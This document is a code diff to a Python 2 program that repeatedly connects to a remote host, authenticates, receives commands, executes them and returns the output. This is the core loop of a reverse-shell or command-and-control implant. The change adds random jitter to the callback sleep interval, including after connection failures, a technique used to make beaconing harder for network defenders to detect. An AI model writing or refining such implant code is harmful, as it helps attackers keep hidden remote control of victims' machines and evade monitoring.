@@ -7,6 +7,7 @@ import commands  # Python 2 replacement for subprocess.getoutput
 # import sys
 import os
 import ssl
+import random
 
 current_dir = os.getcwd()
 # CONFIG_FILE = os.path.abspath("config.json")
@@ -97,23 +98,28 @@ def main():
 
     while True:
         try:
+            # For a 5 second sleep, this adds between -1.0 and +2.5 seconds
+            jitter = random.uniform(-(sleep_time * 0.2), (sleep_time * 0.5))
+            current_sleep = sleep_time + jitter
+            
+            
             sock = create_connection(host, port)
 
             if not authenticate(sock, secret):
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             command = sock.recv(4096)
 
             if not command:
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             if command.strip().lower() == "exit":
                 sock.close()
-                time.sleep(sleep_time)
+                time.sleep(current_sleep)
                 continue
 
             output = execute_command(command)
@@ -123,7 +129,9 @@ def main():
             sock.close()
 
         except Exception:
-            time.sleep(sleep_time)
+            # Re-calculate jitter even on an exception/connection failure
+            jitter = random.uniform(-(sleep_time * 0.2), (sleep_time * 0.5))
+            time.sleep(sleep_time + jitter)
 
 
 if __name__ == "__main__":
